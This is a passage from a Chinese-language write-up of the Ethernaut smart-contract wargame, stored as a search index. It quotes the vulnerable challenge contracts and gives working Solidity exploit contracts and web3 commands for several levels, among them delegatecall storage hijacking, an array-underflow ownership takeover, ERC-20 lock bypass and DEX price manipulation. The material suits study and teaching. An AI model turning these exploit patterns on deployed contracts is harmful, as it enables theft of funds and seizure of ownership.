( bytes8 ( keccak256 ( abi . encodePacked ( msg.sender )))) ^ uint64 ( _gateKey ) == uint64 ( 0 ) - 1 ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a msg.sender != tx.origin \u5f53\u524d caller \u7684 codesize \u4e3a 0 gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF \u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3 \u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc \u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperTwo challenge ; constructor ( address addr ) public { challenge = GatekeeperTwo ( addr ); uint64 key = uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( this )))) ^ uint64 ( 0xFFFFFFFFFFFFFFFF ); challenge . enter ( bytes8 ( key )); } }","title":"Gatekeeper Two"},{"location":"writeups/ethernaut/#naught-coin","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = now + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player ) ERC20 ( 'NaughtCoin' , '0x0' ) public { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { super . transfer ( _to , _value ); } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg.sender == player ) { require ( now > timeLock ); _ ; } else { _ ; } } } \u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol \u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer \u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01 function transferFrom ( address from , address to , uint256 amount ) public virtual override returns ( bool ) { address spender = _msgSender (); _spendAllowance ( from , spender , amount ); _transfer ( from , to , amount ); return true ; } \u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d > ( await contract . balanceOf ( player )). toString () '1000000000000000000000000' > contract . approve ( player , \"1000000000000000000000000\" ) > contract . transferFrom ( player , instance , \"1000000000000000000000000\" ) > ( await contract . balanceOf ( player )). toString () '0'","title":"Naught Coin"},{"location":"writeups/ethernaut/#preservation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address _timeZone1LibraryAddress , address _timeZone2LibraryAddress ) public { timeZone1Library = _timeZone1LibraryAddress ; timeZone2Library = _timeZone2LibraryAddress ; owner = msg.sender ; } // set the time for timezone 1 function setFirstTime ( uint _timeStamp ) public { timeZone1Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } // set the time for timezone 2 function setSecondTime ( uint _timeStamp ) public { timeZone2Library . delegatecall ( abi . encodePacked ( setTimeSignature , _timeStamp )); } } // Simple library contract to set the time contract LibraryContract { // stores a timestamp uint storedTime ; function setTime ( uint _time ) public { storedTime = _time ; } } \u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570 \u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8 \u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570 \u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { address public timeZone1Library ; address public timeZone2Library ; address public owner ; // \u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address function setTime ( uint _time ) public { owner = address ( _time ); } } \u5b9e\u9645\u64cd\u4f5c\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<an address>' > contract . setFirstTime ( \"0x<Exploit contract address>\" ) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<Exploit contract address>' > contract . setFirstTime ( player ) > await web3 . eth . getStorageAt ( instance , 2 ) // owner '0x000000000000000000000000<player address>' > await contract . owner () '0x<player address>'","title":"Preservation"},{"location":"writeups/ethernaut/#recovery","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg.sender , _initialSupply ); } } contract SimpleToken { using SafeMath for uint256 ; // public variables string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) public { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg.sender ] = msg.value . mul ( 10 ); } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg.sender ] >= _amount ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( _amount ); balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d \u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc \u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of SimpleToken */ contract Exploit { SimpleToken token ; constructor ( address payable challenge ) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740 token = SimpleToken ( challenge ); } function exp () public { token . destroy ( msg.sender ); } }","title":"Recovery"},{"location":"writeups/ethernaut/#magicnumber","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract MagicNum { address public solver ; constructor () public {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } \u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42 \u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09 PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length] CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length] \u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801 runtime code: PUSH1 0x2a ; \u5c06 42 \u538b\u5165\u6808\u4e2d PUSH1 0x80 ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80 MSTORE ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a PUSH1 0x20 ; length PUSH1 0x80 ; offset RETURN ; return memory[0x80:0x80+0x20] \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3 \u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a \u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d \u5c06 runtime code \u8fd4\u56de EVM \u6c47\u7f16\uff1a PUSH1 0x0a ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a) PUSH1 0x0c ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C PUSH1 0x00 ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e CODECOPY ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934 PUSH1 0x0a ; length PUSH1 0x00 ; offset RETURN ; \u8fd4\u56de runtime code \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09 \u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3 \u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef > web3 . eth . sendTransaction ({ from : player , data : \"0x600a600c600039600a6000f3602a60805260206080f3\" }) \u26cf\ufe0f Sent transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> \u26cf\ufe0f Mined transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> > contract . setSolver ( \"<contract address>\" ) \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740","title":"MagicNumber"},{"location":"writeups/ethernaut/#alien-codex","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c \u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i \u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e \u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): contract Exploit { function calc () public view returns ( bytes32 ) { return keccak256 ( abi . encode ( bytes32 ( uint ( 1 )))); } } \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 > contract . retract () > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272' > await web3 . eth . getStorageAt ( instance , 1 ) '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' > contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x000000000000000000000001<player address>\" )","title":"Alien Codex"},{"location":"writeups/ethernaut/#denial","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Denial { using SafeMath for uint256 ; address public partner ; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance . div ( 100 ); // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); owner . transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = now ; withdrawPartnerBalances [ partner ] = withdrawPartnerBalances [ partner ]. add ( amountToSend ); } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } \u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7 \u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Denial */ contract Exploit { Denial challenge ; constructor ( address payable addr ) public { challenge = Denial ( addr ); } function exp () public { challenge . setWithdrawPartner ( address ( this )); challenge . withdraw (); } receive () external payable { assert ( false ); } }","title":"Denial"},{"location":"writeups/ethernaut/#shop","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg.sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Shop */ contract Exploit { Shop challenge ; constructor ( address addr ) public { challenge = Shop ( addr ); } function price () external view returns ( uint ) { if ( challenge . isSold ()) { return 90 ; } return 100 ; } function exp () public { challenge . buy (); } }","title":"Shop"},{"location":"writeups/ethernaut/#dex-dex-two","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Dex { using SafeMath for uint ; address public token1 ; address public token2 ; constructor ( address _token1 , address _token2 ) public { token1 = _token1 ; token2 = _token2 ; } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg.sender ) >= amount , \"Not enough to swap\" ); uint swap_amount = get_swap_price ( from , to , amount ); IERC20 ( from ). transferFrom ( msg.sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swap_amount ); IERC20 ( to ). transferFrom ( address ( this ), msg.sender , swap_amount ); } function add_liquidity ( address token_address , uint amount ) public { IERC20 ( token_address ). transferFrom ( msg.sender , address ( this ), amount ); } function get_swap_price ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( spender , amount ); SwappableToken ( token2 ). approve ( spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { constructor ( string memory name , string memory symbol , uint initialSupply ) public ERC20 ( name , symbol ) { _mint ( msg.sender , initialSupply ); } } \u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 \u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6 \u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86 Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Dex */ contract ExploitToken { function balanceOf ( address account ) public view returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) public returns ( bool ) { return true ; } } contract Exploit { address token = address ( new ExploitToken ()); Dex challenge ; constructor ( address addr ) public { challenge = Dex ( addr ); } function exp ( address token1 ) public { challenge . swap ( token , token1 , 1 ); } }","title":"Dex &amp; Dex Two"},{"location":"writeups/ethernaut/#puzzle-wallet","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; pragma experimental ABIEncoderV2 ; import \"@openzeppelin/contracts/math/SafeMath.sol\" ; import \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) public { admin = _admin ; } modifier onlyAdmin { require ( msg.sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { using SafeMath for uint256 ; address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg.sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg.sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg.sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg.sender ] = balances [ msg.sender ]. add ( msg.value ); } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg.sender ] >= value , \"Insufficient balance\" ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( value ); ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector : = mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player \u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin \u4ece\u540e\u5f80\u524d\u63a8\uff1a \u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player \u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0 \u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value 